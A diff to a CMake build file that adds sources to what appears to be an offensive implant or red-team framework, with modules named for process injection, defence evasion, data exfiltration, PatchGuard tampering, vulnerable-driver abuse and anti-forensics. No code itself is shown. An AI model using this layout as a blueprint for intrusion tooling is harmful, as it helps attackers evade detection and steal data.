@@ -93,6 +93,20 @@ set(RUNTIME_SOURCES
     memory/vmem.c
     windows/registry/registry.c
     windows/windows_api_impl.c
+    windows/network/http.c
+    windows/windows_utils.c
+    windows/apis/complete_apis.c
+    windows/security/token_manipulation.c
+    windows/execution/process_injection.c
+    windows/evasion/blindside.c
+    windows/evasion/process_spoofing.c
+    windows/threading/threadpool_windows.c
+    windows/audit/audit.c
+    windows/exfil/enhanced_exfiltration.c
+    windows/kernel/patchguard_peekaboo.c
+    windows/security/byoud.c
+    windows/anti_forensics/cache_cleanup.c
+    win_wrapper.c
     byovd/driver_scoring.c
     byovd/byovd_manifest.c
     byovd/byovd_modular.c
@@ -102,6 +116,21 @@ set(RUNTIME_SOURCES
 
     # Compression - FFI bindings with real zlib compression
     compression/compression.c
+
+    # Cross-platform crypto (AES/RSA/ECDH via OpenSSL)
+    crypto/crypto.c
+
+    # Cross-platform socket/network API
+    network/network.c
+
+    # Cross-platform system info
+    sysinfo.c
+
+    # CDN exfiltration (curl-based, cross-platform)
+    exfil/cdn.c
+
+    # Custom VM interpreter
+    vm/vm_interpreter.c
 
     # Core APIs
     core/sandbox.c
@@ -294,6 +323,20 @@ if(UNIX OR NOT WIN32)
         windows/windows_api_impl.c
         pack/stub_loader.c
         windows/registry/registry.c
+        windows/network/http.c
+        windows/windows_utils.c
+        windows/apis/complete_apis.c
+        windows/security/token_manipulation.c
+        windows/execution/process_injection.c
+        windows/evasion/blindside.c
+        windows/evasion/process_spoofing.c
+        windows/threading/threadpool_windows.c
+        windows/audit/audit.c
+        windows/exfil/enhanced_exfiltration.c
+        windows/kernel/patchguard_peekaboo.c
+        windows/security/byoud.c
+        windows/anti_forensics/cache_cleanup.c
+        win_wrapper.c
         byovd/driver_scoring.c
         byovd/byovd_manifest.c
         byovd/byovd_modular.c
